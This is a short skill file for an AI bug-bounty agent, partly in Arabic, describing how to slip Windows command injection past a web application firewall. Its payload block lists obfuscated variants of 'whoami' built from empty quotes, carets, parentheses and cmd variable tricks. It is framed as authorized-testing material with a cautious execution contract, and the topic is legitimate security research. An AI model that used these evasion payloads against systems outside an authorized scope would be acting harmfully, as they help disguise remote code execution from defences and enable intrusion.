# SKILL: WAF Bypass لأمر whoami عبر تقنيات تفتيت السترينج

**Skill id:** `tip/waf-bypass-لأمر-whoami-عبر-تقنيات-تفتيت-السترينج`  
**Category:** RCE, WAF Bypass  
**Rating:** ⭐ جيدة  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dcdac31e88081f0bcc2d892ab14a737  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **RCE, WAF Bypass**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

استخدام علامات تنصيص فاضية (") وcaret (\^) وتقنيات الـ Windows cmd variables عشان تكسر شكل الأمر المتوقع من الـ WAF مع الحفاظ على تنفيذه الفعلي.

## Payload / Code

```
whoami
w"h"o"a"m"i
w"h"o"a"m"i"
wh""o\^a\^mi
wh""o\^am"i
((((Wh\^o\^am""i))))
w""""""""""""""hoami
w""""""""""""""hoa\^m""i
w""""""""""""""hoa\^\^m""i

set a=1
echo a
echo %a%
```

## Source

Blackhold @90sec...

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
